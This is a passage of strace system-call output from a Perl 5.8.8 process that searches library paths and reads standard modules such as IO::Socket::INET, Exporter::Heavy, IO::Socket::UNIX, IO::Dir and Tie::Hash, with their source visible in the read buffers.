my($lport,$rport,$laddr,$raddr,$proto,$type);\n\n    $arg->{LocalAddr} = $arg->{LocalHost}\n\tif exists $arg->{LocalHost} && !exists $arg->{LocalAddr};\n\n    ($laddr,$lport,$proto) = _sock_info($arg->{LocalAddr},\n\t\t\t\t\t$arg->{LocalPort},\n\t\t\t\t\t$arg->{Proto})\n\t\t\tor return _error($sock, $!, $@);\n\n    $laddr = defined $laddr ? inet_aton($laddr)\n\t\t\t    : INADDR_ANY;\n\n    return _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{LocalAddr},\"\'\")\n\tunless(defined $laddr);\n\n    $arg->{PeerAddr} = $arg->{PeerHost}\n\tif exists $arg->{PeerHost} && !exists $arg->{PeerAddr};\n\n    unless(exists $arg->{Listen}) {\n\t($raddr,$rport,$proto) = _sock_info($arg->{PeerAddr},\n\t\t\t\t\t    $arg->{PeerPort},\n\t\t\t\t\t    $proto)\n\t\t\tor return _error($sock, $!, $@);\n    }\n\n    $proto ||= (getprotobyname(\'tcp\'))[2];\n\n    my $pname = (getprotobynumber($proto))[0];\n    $type = $arg->{Type} || $socket_type{lc $pname};\n\n    my @raddr = ();\n\n    if(defined $raddr) {\n\t@raddr = $sock->_get_addr($raddr, $arg->{MultiHomed});\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless @raddr;\n    }\n\n    while(1) {\n\n\t$sock->socket(AF_INET, $type, $proto) or\n\t    return _error($sock, $!, \"$!\");\n\n        if (defined $arg->{Blocking}) {\n\t    defined $sock->blocking($arg->{Blocking})\n\t\tor return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Reuse} || $arg->{ReuseAddr}) {\n\t    $sock->sockopt(SO_REUSEADDR,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{ReusePort}) {\n\t    $sock->sockopt(SO_REUSEPORT,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif ($arg->{Broadcast}) {\n\t\t$sock->sockopt(SO_BROADCAST,1) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif($lport || ($laddr ne INADDR_ANY) || exists $arg->{Listen}) {\n\t    $sock->bind($lport || 0, $laddr) or\n\t\t    return _error($sock, $!, \"$!\");\n\t}\n\n\tif(exists $arg->{Listen}) {\n\t    $sock->listen($arg->{Listen} || 5) or\n\t\treturn _error($sock, $!, \"$!\");\n\t    last;\n\t}\n\n \t# don\'t try to connect unless we\'re given a PeerAddr\n \tlast unless e", 4096) = 4096
6687  07:15:03.363330 stat64("/etc/perl/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363347 stat64("/etc/perl/Exporter/Heavy.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363360 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363374 stat64("/usr/local/lib/perl/5.8.8/Exporter/Heavy.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363388 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363401 stat64("/usr/local/share/perl/5.8.8/Exporter/Heavy.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363416 stat64("/usr/lib/perl5/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363428 stat64("/usr/lib/perl5/Exporter/Heavy.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363442 stat64("/usr/share/perl5/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363454 stat64("/usr/share/perl5/Exporter/Heavy.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363467 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363480 stat64("/usr/lib/perl/5.8/Exporter/Heavy.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363494 stat64("/usr/share/perl/5.8/Exporter/Heavy.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.363508 stat64("/usr/share/perl/5.8/Exporter/Heavy.pm", {st_mode=S_IFREG|0644, st_size=6252, ...}) = 0
6687  07:15:03.363529 open("/usr/share/perl/5.8/Exporter/Heavy.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.363544 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.363555 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.363573 read(8, "package Exporter::Heavy;\n\nuse strict;\nno strict \'refs\';\n\n# On one line so MakeMaker will see it.\nrequire Exporter;  our $VERSION = $Exporter::VERSION;\n$Carp::Internal{\"Exporter::Heavy\"} = 1;\n\n#\n# We go to a lot of trouble not to \'require Carp\' at file scope,\n#  because Carp requires Exporter, and something has to give.\n#\n\nsub _rebuild_cache {\n    my ($pkg, $exports, $cache) = @_;\n    s/^&// foreach @$exports;\n    @{$cache}{@$exports} = (1) x @$exports;\n    my $ok = \\@{\"${pkg}::EXPORT_OK\"};\n    if (@$ok) {\n\ts/^&// foreach @$ok;\n\t@{$cache}{@$ok} = (1) x @$ok;\n    }\n}\n\nsub heavy_export {\n\n    # First make import warnings look like they\'re coming from the \"use\".\n    local $SIG{__WARN__} = sub {\n\tmy $text = shift;\n\tif ($text =~ s/ at \\S*Exporter\\S*.pm line \\d+.*\\n//) {\n\t    require Carp;\n\t    local $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\t    Carp::carp($text);\n\t}\n\telse {\n\t    warn $text;\n\t}\n    };\n    local $SIG{__DIE__} = sub {\n\trequire Carp;\n\tlocal $Carp::CarpLevel = 1;\t# ignore package calling us too.\n\tCarp::croak(\"$_[0]Illegal null symbol in \\@${1}::EXPORT\")\n\t    if $_[0] =~ /^Unable to create sub named \"(.*?)::\"/;\n    };\n\n    my($pkg, $callpkg, @imports) = @_;\n    my($type, $sym, $cache_is_current, $oops);\n    my($exports, $export_cache) = (\\@{\"${pkg}::EXPORT\"},\n                                   $Exporter::Cache{$pkg} ||= {});\n\n    if (@imports) {\n\tif (!%$export_cache) {\n\t    _rebuild_cache ($pkg, $exports, $export_cache);\n\t    $cache_is_current = 1;\n\t}\n\n\tif (grep m{^[/!:]}, @imports) {\n\t    my $tagsref = \\%{\"${pkg}::EXPORT_TAGS\"};\n\t    my $tagdata;\n\t    my %imports;\n\t    my($remove, $spec, @names, @allexports);\n\t    # negated first item implies starting with default set:\n\t    unshift @imports, \':DEFAULT\' if $imports[0] =~ m/^!/;\n\t    foreach $spec (@imports){\n\t\t$remove = $spec =~ s/^!//;\n\n\t\tif ($spec =~ s/^://){\n\t\t    if ($spec eq \'DEFAULT\'){\n\t\t\t@names = @$exports;\n\t\t    }\n\t\t    elsif ($tagdata = $tagsref->{$spec}) {\n\t\t\t@names = @$tagdata;\n\t\t    }\n\t\t    else {\n\t\t\twarn qq[\"$spec\" is not defined in %${pkg}::EXPORT_TAGS];\n\t\t\t++$oops;\n\t\t\tnext;\n\t\t    }\n\t\t}\n\t\telsif ($spec =~ m:^/(.*)/$:){\n\t\t    my $patn = $1;\n\t\t    @allexports = keys %$export_cache unless @allexports; # only do keys once\n\t\t    @names = grep(/$patn/, @allexports); # not anchored by default\n\t\t}\n\t\telse {\n\t\t    @names = ($spec); # is a normal symbol name\n\t\t}\n\n\t\twarn \"Import \".($remove ? \"del\":\"add\").\": @names \"\n\t\t    if $Exporter::Verbose;\n\n\t\tif ($remove) {\n\t\t   foreach $sym (@names) { delete $imports{$sym} } \n\t\t}\n\t\telse {\n\t\t    @imports{@names} = (1) x @names;\n\t\t}\n\t    }\n\t    @imports = keys %imports;\n\t}\n\n        my @carp;\n\tforeach $sym (@imports) {\n\t    if (!$export_cache->{$sym}) {\n\t\tif ($sym =~ m/^\\d/) {\n\t\t    $pkg->VERSION($sym); # inherit from UNIVERSAL\n\t\t    # If the version number was the only thing specified\n\t\t    # then we should act as if nothing was specified:\n\t\t    if (@imports == 1) {\n\t\t\t@imports = @$exports;\n\t\t\tlast;\n\t\t    }\n\t\t    # We need a way to emulate \'use Foo ()\' but still\n\t\t    # allow an easy version check: \"use Foo 1.23, \'\'\";\n\t\t    if (@imports == 2 and !$imports[1]) {\n\t\t\t@imports = ();\n\t\t\tlast;\n\t\t    }\n\t\t} elsif ($sym !~ s/^&// || !$export_cache->{$sym}) {\n\t\t    # Last chance - see if they\'ve updated EXPORT_OK since we\n\t\t    # cached it.\n\n\t\t    unless ($cache_is_current) {\n\t\t\t%$export_cache = ();\n\t\t\t_rebuild_cache ($pkg, $exports, $export_cache);\n\t\t\t$cache_is_current = 1;\n\t\t    }\n\n\t\t    if (!$export_cache->{$sym}) {\n\t\t\t# accumulate the non-exports\n\t\t\tpush @carp,\n\t\t\t  qq[\"$sym\" is not exported by the $pkg module\\n];\n\t\t\t$oops++;\n\t\t    }\n\t\t}\n\t    }\n\t}\n\tif ($oops) {\n\t    require Carp;\n\t    Carp::croak(\"@{carp}Can\'t continue after import errors\");\n\t}\n    }\n    else {\n\t@imports = @$exports;\n    }\n\n    my($fail, $fail_cache) = (\\@{\"${pkg}::EXPORT_FAIL\"},\n                              $Exporter::FailCache{$pkg} ||= {});\n\n    if (@$fail) {\n\tif (!%$fail_cache) {\n\t    # Build cache of symbols. Optimise the lookup by adding\n\t    # barewords twice... both with and without a leading &.\n\t    # (Technique could be applied to $export_cac", 4096) = 4096
6687  07:15:03.364361 read(8, "he at cost of memory)\n\t    my @expanded = map { /^\\w/ ? ($_, \'&\'.$_) : $_ } @$fail;\n\t    warn \"${pkg}::EXPORT_FAIL cached: @expanded\" if $Exporter::Verbose;\n\t    @{$fail_cache}{@expanded} = (1) x @expanded;\n\t}\n\tmy @failed;\n\tforeach $sym (@imports) { push(@failed, $sym) if $fail_cache->{$sym} }\n\tif (@failed) {\n\t    @failed = $pkg->export_fail(@failed);\n\t    foreach $sym (@failed) {\n                require Carp;\n\t\tCarp::carp(qq[\"$sym\" is not implemented by the $pkg module ],\n\t\t\t\"on this architecture\");\n\t    }\n\t    if (@failed) {\n\t\trequire Carp;\n\t\tCarp::croak(\"Can\'t continue after import errors\");\n\t    }\n\t}\n    }\n\n    warn \"Importing into $callpkg from $pkg: \",\n\t\tjoin(\", \",sort @imports) if $Exporter::Verbose;\n\n    foreach $sym (@imports) {\n\t# shortcut for the common case of no type character\n\t(*{\"${callpkg}::$sym\"} = \\&{\"${pkg}::$sym\"}, next)\n\t    unless $sym =~ s/^(\\W)//;\n\t$type = $1;\n\t*{\"${callpkg}::$sym\"} =\n\t    $type eq \'&\' ? \\&{\"${pkg}::$sym\"} :\n\t    $type eq \'$\' ? \\${\"${pkg}::$sym\"} :\n\t    $type eq \'@\' ? \\@{\"${pkg}::$sym\"} :\n\t    $type eq \'%\' ? \\%{\"${pkg}::$sym\"} :\n\t    $type eq \'*\' ?  *{\"${pkg}::$sym\"} :\n\t    do { require Carp; Carp::croak(\"Can\'t export symbol: $type$sym\") };\n    }\n}\n\nsub heavy_export_to_level\n{\n      my $pkg = shift;\n      my $level = shift;\n      (undef) = shift;\t\t\t# XXX redundant arg\n      my $callpkg = caller($level);\n      $pkg->export($callpkg, @_);\n}\n\n# Utility functions\n\nsub _push_tags {\n    my($pkg, $var, $syms) = @_;\n    my @nontag = ();\n    my $export_tags = \\%{\"${pkg}::EXPORT_TAGS\"};\n    push(@{\"${pkg}::$var\"},\n\tmap { $export_tags->{$_} ? @{$export_tags->{$_}} \n                                 : scalar(push(@nontag,$_),$_) }\n\t\t(@$syms) ? @$syms : keys %$export_tags);\n    if (@nontag and $^W) {\n\t# This may change to a die one day\n\trequire Carp;\n\tCarp::carp(join(\", \", @nontag).\" are not tags of $pkg\");\n    }\n}\n\nsub heavy_require_version {\n    my($self, $wanted) = @_;\n    my $pkg = ref $self || $self;\n    return ${pkg}->VERSION($wanted);\n}\n\nsub heavy_export_tags {\n  _push_tags((caller)[0], \"EXPORT\",    \\@_);\n}\n\nsub heavy_export_ok_tags {\n  _push_tags((caller)[0], \"EXPORT_OK\", \\@_);\n}\n\n1;\n", 4096) = 2156
6687  07:15:03.364569 brk(0x829c000)    = 0x829c000
6687  07:15:03.364869 read(8, "", 4096) = 0
6687  07:15:03.379244 close(8)          = 0
6687  07:15:03.380386 read(6, "xists($arg->{PeerAddr});\n \n        $raddr = shift @raddr;\n\n\treturn _error($sock, $EINVAL, \'Cannot determine remote port\')\n\t\tunless($rport || $type == SOCK_DGRAM || $type == SOCK_RAW);\n\n\tlast\n\t    unless($type == SOCK_STREAM || defined $raddr);\n\n\treturn _error($sock, $EINVAL, \"Bad hostname \'\",$arg->{PeerAddr},\"\'\")\n\t    unless defined $raddr;\n\n#        my $timeout = ${*$sock}{\'io_socket_timeout\'};\n#        my $before = time() if $timeout;\n\n\tundef $@;\n        if ($sock->connect(pack_sockaddr_in($rport, $raddr))) {\n#            ${*$sock}{\'io_socket_timeout\'} = $timeout;\n            return $sock;\n        }\n\n\treturn _error($sock, $!, $@ || \"Timeout\")\n\t    unless @raddr;\n\n#\tif ($timeout) {\n#\t    my $new_timeout = $timeout - (time() - $before);\n#\t    return _error($sock,\n#                         (exists(&Errno::ETIMEDOUT) ? Errno::ETIMEDOUT() : $EINVAL),\n#                         \"Timeout\") if $new_timeout <= 0;\n#\t    ${*$sock}{\'io_socket_timeout\'} = $new_timeout;\n#        }\n\n    }\n\n    $sock;\n}\n\nsub connect {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->connect(NAME) or $sock->connect(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::connect(@_ == 1 ? shift : pack_sockaddr_in(@_));\n}\n\nsub bind {\n    @_ == 2 || @_ == 3 or\n       croak \'usage: $sock->bind(NAME) or $sock->bind(PORT, ADDR)\';\n    my $sock = shift;\n    return $sock->SUPER::bind(@_ == 1 ? shift : pack_sockaddr_in(@_))\n}\n\nsub sockaddr {\n    @_ == 1 or croak \'usage: $sock->sockaddr()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub sockport {\n    @_ == 1 or croak \'usage: $sock->sockport()\';\n    my($sock) = @_;\n    my $name = $sock->sockname;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub sockhost {\n    @_ == 1 or croak \'usage: $sock->sockhost()\';\n    my($sock) = @_;\n    my $addr = $sock->sockaddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\nsub peeraddr {\n    @_ == 1 or croak \'usage: $sock->peeraddr()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[1] : undef;\n}\n\nsub peerport {\n    @_ == 1 or croak \'usage: $sock->peerport()\';\n    my($sock) = @_;\n    my $name = $sock->peername;\n    $name ? (sockaddr_in($name))[0] : undef;\n}\n\nsub peerhost {\n    @_ == 1 or croak \'usage: $sock->peerhost()\';\n    my($sock) = @_;\n    my $addr = $sock->peeraddr;\n    $addr ? inet_ntoa($addr) : undef;\n}\n\n1;\n\n__END__\n\n", 4096) = 2401
6687  07:15:03.380839 _llseek(6, 6496, [6496], SEEK_SET) = 0
6687  07:15:03.380856 _llseek(6, 0, [6496], SEEK_CUR) = 0
6687  07:15:03.380866 close(6)          = 0
6687  07:15:03.380927 stat64("/etc/perl/IO/Socket/UNIX.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.380943 stat64("/etc/perl/IO/Socket/UNIX.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.380958 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.380971 stat64("/usr/local/lib/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.380986 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.380999 stat64("/usr/local/share/perl/5.8.8/IO/Socket/UNIX.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.381013 stat64("/usr/lib/perl5/IO/Socket/UNIX.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.381025 stat64("/usr/lib/perl5/IO/Socket/UNIX.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.381039 stat64("/usr/share/perl5/IO/Socket/UNIX.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.381051 stat64("/usr/share/perl5/IO/Socket/UNIX.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.381065 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.381078 stat64("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", {st_mode=S_IFREG|0644, st_size=1387, ...}) = 0
6687  07:15:03.381100 open("/usr/lib/perl/5.8/IO/Socket/UNIX.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.381115 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.381127 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.381142 brk(0x82bd000)    = 0x82bd000
6687  07:15:03.381160 read(6, "# IO::Socket::UNIX.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket::UNIX;\n\nuse strict;\nour(@ISA, $VERSION);\nuse IO::Socket;\nuse Socket;\nuse Carp;\n\n@ISA = qw(IO::Socket);\n$VERSION = \"1.22\";\n$VERSION = eval $VERSION;\n\nIO::Socket::UNIX->register_domain( AF_UNIX );\n\nsub new {\n    my $class = shift;\n    unshift(@_, \"Peer\") if @_ == 1;\n    return $class->SUPER::new(@_);\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my($bport,$cport);\n\n    my $type = $arg->{Type} || SOCK_STREAM;\n\n    $sock->socket(AF_UNIX, $type, 0) or\n\treturn undef;\n\n    if(exists $arg->{Local}) {\n\tmy $addr = sockaddr_un($arg->{Local});\n\t$sock->bind($addr) or\n\t    return undef;\n    }\n    if(exists $arg->{Listen} && $type != SOCK_DGRAM) {\n\t$sock->listen($arg->{Listen} || 5) or\n\t    return undef;\n    }\n    elsif(exists $arg->{Peer}) {\n\tmy $addr = sockaddr_un($arg->{Peer});\n\t$sock->connect($addr) or\n\t    return undef;\n    }\n\n    $sock;\n}\n\nsub hostpath {\n    @_ == 1 or croak \'usage: $sock->hostpath()\';\n    my $n = $_[0]->sockname || return undef;\n    (sockaddr_un($n))[0];\n}\n\nsub peerpath {\n    @_ == 1 or croak \'usage: $sock->peerpath()\';\n    my $n = $_[0]->peername || return undef;\n    (sockaddr_un($n))[0];\n}\n\n1; # Keep require happy\n\n__END__\n\n", 4096) = 1387
6687  07:15:03.382126 _llseek(6, 1386, [1386], SEEK_SET) = 0
6687  07:15:03.382144 _llseek(6, 0, [1386], SEEK_CUR) = 0
6687  07:15:03.382154 close(6)          = 0
6687  07:15:03.382209 stat64("/etc/perl/IO/Dir.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.399267 stat64("/etc/perl/IO/Dir.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.399320 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.399340 stat64("/usr/local/lib/perl/5.8.8/IO/Dir.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.399357 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.399372 stat64("/usr/local/share/perl/5.8.8/IO/Dir.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.399388 stat64("/usr/lib/perl5/IO/Dir.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.399401 stat64("/usr/lib/perl5/IO/Dir.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.399417 stat64("/usr/share/perl5/IO/Dir.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.399430 stat64("/usr/share/perl5/IO/Dir.pm", 0xbfdada0c) = -1 ENOENT (No such file or directory)
6687  07:15:03.399445 stat64("/usr/lib/perl/5.8/IO/Dir.pmc", 0xbfdadafc) = -1 ENOENT (No such file or directory)
6687  07:15:03.399460 stat64("/usr/lib/perl/5.8/IO/Dir.pm", {st_mode=S_IFREG|0644, st_size=5318, ...}) = 0
6687  07:15:03.399484 open("/usr/lib/perl/5.8/IO/Dir.pm", O_RDONLY|O_LARGEFILE) = 6
6687  07:15:03.399501 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad818) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.399514 _llseek(6, 0, [0], SEEK_CUR) = 0
6687  07:15:03.399538 read(6, "# IO::Dir.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Dir;\n\nuse 5.006;\n\nuse strict;\nuse Carp;\nuse Symbol;\nuse Exporter;\nuse IO::File;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Tie::Hash;\nuse File::stat;\nuse File::Spec;\n\n@ISA = qw(Tie::Hash Exporter);\n$VERSION = \"1.05\";\n$VERSION = eval $VERSION;\n@EXPORT_OK = qw(DIR_UNLINK);\n\nsub DIR_UNLINK () { 1 }\n\nsub new {\n    @_ >= 1 && @_ <= 2 or croak \'usage: new IO::Dir [DIRNAME]\';\n    my $class = shift;\n    my $dh = gensym;\n    if (@_) {\n\tIO::Dir::open($dh, $_[0])\n\t    or return undef;\n    }\n    bless $dh, $class;\n}\n\nsub DESTROY {\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub open {\n    @_ == 2 or croak \'usage: $dh->open(DIRNAME)\';\n    my ($dh, $dirname) = @_;\n    return undef\n\tunless opendir($dh, $dirname);\n    # a dir name should always have a \":\" in it; assume dirname is\n    # in current directory\n    $dirname = \':\' .  $dirname if ( ($^O eq \'MacOS\') && ($dirname !~ /:/) );\n    ${*$dh}{io_dir_path} = $dirname;\n    1;\n}\n\nsub close {\n    @_ == 1 or croak \'usage: $dh->close()\';\n    my ($dh) = @_;\n    closedir($dh);\n}\n\nsub read {\n    @_ == 1 or croak \'usage: $dh->read()\';\n    my ($dh) = @_;\n    readdir($dh);\n}\n\nsub seek {\n    @_ == 2 or croak \'usage: $dh->seek(POS)\';\n    my ($dh,$pos) = @_;\n    seekdir($dh,$pos);\n}\n\nsub tell {\n    @_ == 1 or croak \'usage: $dh->tell()\';\n    my ($dh) = @_;\n    telldir($dh);\n}\n\nsub rewind {\n    @_ == 1 or croak \'usage: $dh->rewind()\';\n    my ($dh) = @_;\n    rewinddir($dh);\n}\n\nsub TIEHASH {\n    my($class,$dir,$options) = @_;\n\n    my $dh = $class->new($dir)\n\tor return undef;\n\n    $options ||= 0;\n\n    ${*$dh}{io_dir_unlink} = $options & DIR_UNLINK;\n    $dh;\n}\n\nsub FIRSTKEY {\n    my($dh) = @_;\n    $dh->rewind;\n    scalar $dh->read;\n}\n\nsub NEXTKEY {\n    my($dh) = @_;\n    scalar $dh->read;\n}\n\nsub EXISTS {\n    my($dh,$key) = @_;\n    -e File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n}\n\nsub FETCH {\n    my($dh,$key) = @_;\n    &lstat(File::Spec->catfile(${*$dh}{io_dir_path}, $key));\n}\n\nsub STORE {\n    my($dh,$key,$data) = @_;\n    my($atime,$mtime) = ref($data) ? @$data : ($data,$data);\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n    unless(-e $file) {\n\tmy $io = IO::File->new($file,O_CREAT | O_RDWR);\n\t$io->close if $io;\n    }\n    utime($atime,$mtime, $file);\n}\n\nsub DELETE {\n    my($dh,$key) = @_;\n\n    # Only unlink if unlink-ing is enabled\n    return 0\n\tunless ${*$dh}{io_dir_unlink};\n\n    my $file = File::Spec->catfile(${*$dh}{io_dir_path}, $key);\n\n    -d $file\n\t? rmdir($file)\n\t: unlink($file);\n}\n\n1;\n\n__END__\n\n=head1 NAME \n\nIO::Dir - supply object methods for directory handles\n\n=head1 SYNOPSIS\n\n    use IO::Dir;\n    $d = IO::Dir->new(\".\");\n    if (defined $d) {\n        while (defined($_ = $d->read)) { something($_); }\n        $d->rewind;\n        while (defined($_ = $d->read)) { something_else($_); }\n        undef $d;\n    }\n\n    tie %dir, \'IO::Dir\', \".\";\n    foreach (keys %dir) {\n\tprint $_, \" \" , $dir{$_}->size,\"\\n\";\n    }\n\n=head1 DESCRIPTION\n\nThe C<IO::Dir> package provides two interfaces to perl\'s directory reading\nroutines.\n\nThe first interface is an object approach. C<IO::Dir> provides an object\nconstructor and methods, which are just wrappers around perl\'s built in\ndirectory reading routines.\n\n=over 4\n\n=item new ( [ DIRNAME ] )\n\nC<new> is the constructor for C<IO::Dir> objects. It accepts one optional\nargument which,  if given, C<new> will pass to C<open>\n\n=back\n\nThe following methods are wrappers for the directory related functions built\ninto perl (the trailing `dir\' has been removed from the names). See L<perlfunc>\nfor details of these functions.\n\n=over 4\n\n=item open ( DIRNAME )\n\n=item read ()\n\n=item seek ( POS )\n\n=item tell ()\n\n=item rewind ()\n\n=item close ()\n\n=back\n\nC<IO::Dir> also provides an interface to reading directories via a tied\nhash. The tied hash extends the interface beyond just the directory\nreading routines by the use of C<lstat>, from the C<File::stat> package,\nC<unlin", 4096) = 4096
6687  07:15:03.400134 stat64("/etc/perl/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400154 stat64("/etc/perl/Tie/Hash.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400169 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400184 stat64("/usr/local/lib/perl/5.8.8/Tie/Hash.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400226 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400246 stat64("/usr/local/share/perl/5.8.8/Tie/Hash.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400278 stat64("/usr/lib/perl5/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400290 stat64("/usr/lib/perl5/Tie/Hash.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400303 stat64("/usr/share/perl5/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400315 stat64("/usr/share/perl5/Tie/Hash.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400328 stat64("/usr/lib/perl/5.8/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400341 stat64("/usr/lib/perl/5.8/Tie/Hash.pm", 0xbfdad55c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400354 stat64("/usr/share/perl/5.8/Tie/Hash.pmc", 0xbfdad64c) = -1 ENOENT (No such file or directory)
6687  07:15:03.400367 stat64("/usr/share/perl/5.8/Tie/Hash.pm", {st_mode=S_IFREG|0644, st_size=7304, ...}) = 0
6687  07:15:03.400389 open("/usr/share/perl/5.8/Tie/Hash.pm", O_RDONLY|O_LARGEFILE) = 8
6687  07:15:03.400403 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfdad368) = -1 ENOTTY (Inappropriate ioctl for device)
6687  07:15:03.400415 _llseek(8, 0, [0], SEEK_CUR) = 0
6687  07:15:03.400434 read(8, "package Tie::Hash;\n\nour $VERSION = \'1.02\';\n\n=head1 NAME\n\nTie::Hash, Tie::StdHash, Tie::ExtraHash - base class definitions for tied hashes\n\n=head1 SYNOPSIS\n\n    package NewHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::Hash);\n\n    sub DELETE { ... }\t\t# Provides needed method\n    sub CLEAR { ... }\t\t# Overrides inherited method\n\n\n    package NewStdHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::StdHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0]};\n    # TIEHASH should return a reference to the actual storage\n    sub DELETE { ... }\n\n    package NewExtraHash;\n    require Tie::Hash;\n\n    @ISA = (Tie::ExtraHash);\n\n    # All methods provided by default, define only those needing overrides\n    # Accessors access the storage in %{$_[0][0]};\n    # TIEHASH should return an array reference with the first element being\n    # the reference to the actual storage \n    sub DELETE { \n      $_[0][1]->(\'del\', $_[0][0], $_[1]); # Call the report writer\n      delete $_[0][0]->{$_[1]};\t\t  